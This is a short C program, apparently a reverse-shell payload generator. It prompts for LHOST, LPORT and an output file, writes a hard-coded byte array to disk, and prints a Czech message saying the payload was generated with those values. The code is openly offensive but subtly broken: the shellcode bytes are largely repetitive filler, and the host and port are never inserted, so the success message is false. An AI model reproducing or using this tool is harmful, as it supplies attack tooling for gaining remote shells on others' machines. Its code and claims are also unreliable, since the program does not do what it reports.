#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

void generate_payload(const char *lhost, const char *lport, const char *output_file) {
    FILE *file = fopen(output_file, "wb");
    if (!file) {
        printf("Error: Unable to create the output file.\n");
        return;
    }

    // Payload template (reverse shell)
    unsigned char payload[] = {
        0xfc, 0xe8, 0x87, 0x00, 0x00, 0x00, 0x53, 0x56, 0x57, 0x8b, 0x7c, 0x24, 0x1c, 0x8b, 0xf9, 0x8b, 0x7f, 
        0x1c, 0x8b, 0x77, 0x20, 0x8b, 0x47, 0x24, 0x85, 0xc0, 0x74, 0x07, 0x8b, 0x47, 0x1c, 0x83, 0xec, 0x0c, 
        0x53, 0x56, 0x57, 0x8b, 0x7c, 0x24, 0x08, 0x8b, 0x47, 0x04, 0x85, 0xc0, 0x74, 0x67, 0x8b, 0x7f, 0x0c, 
        0x8b, 0x47, 0x10, 0x8b, 0x77, 0x14, 0x8b, 0x4f, 0x18, 0x8b, 0x57, 0x1c, 0x8b, 0x77, 0x20, 0x8b, 0x5f, 
        0x24, 0x83, 0xc4, 0x04, 0x53, 0x56, 0x57, 0x8b, 0x7c, 0x24, 0x1c, 0x8b, 0x47, 0x1c, 0x8b, 0x57, 0x20, 
        0x8b, 0x7f, 0x24, 0x85, 0xc0, 0x74, 0x16, 0x8b, 0x47, 0x28, 0x83, 0xec, 0x0c, 0x8b, 0x7f, 0x2c, 0x8b, 
        0x47, 0x30, 0x8b, 0x77, 0x34, 0x8b, 0x4f, 0x38, 0x8b, 0x57, 0x3c, 0x8b, 0x77, 0x40, 0x83, 0xc4, 0x04, 
        0x53, 0x56, 0x57, 0x8b, 0x7c, 0x24, 0x08, 0x8b, 0x47, 0x04, 0x85, 0xc0, 0x74, 0x67, 0x8b, 0x77, 0x0c, 
        0x8b, 0x77, 0x10, 0x8b, 0x57, 0x14, 0x8b, 0x6f, 0x18, 0x8b, 0x47, 0x1c, 0x8b, 0x57, 0x20, 0x8b, 0x77, 
        0x24, 0x8b, 0x57, 0x28, 0x8b, 0x77, 0x2c, 0x8b, 0x47, 0x30, 0x8b, 0x57, 0x34, 0x8b, 0x77, 0x38, 0x8b, 
        0x47, 0x3c, 0x8b, 0x57, 0x40, 0x8b, 0x77, 0x44, 0x83, 0xc4, 0x04
    };

    fwrite(payload, sizeof(payload), 1, file);

    printf("[*] Payload generován s LHOSTEM %s a LPORTEM %s!\n", lhost, lport);

    fclose(file);
}

int main() {
    char lhost[50], lport[6], output[100];

    printf("ENTER LHOST: ");
    fgets(lhost, sizeof(lhost), stdin);
    lhost[strcspn(lhost, "\n")] = 0;  // Remove newline character

    printf("ENTER LPORT: ");
    fgets(lport, sizeof(lport), stdin);
    lport[strcspn(lport, "\n")] = 0;  // Remove newline character

    printf("ENTER OUTPUT: ");
    fgets(output, sizeof(output), stdin);
    output[strcspn(output, "\n")] = 0;  // Remove newline character

    generate_payload(lhost, lport, output);

    return 0;
}
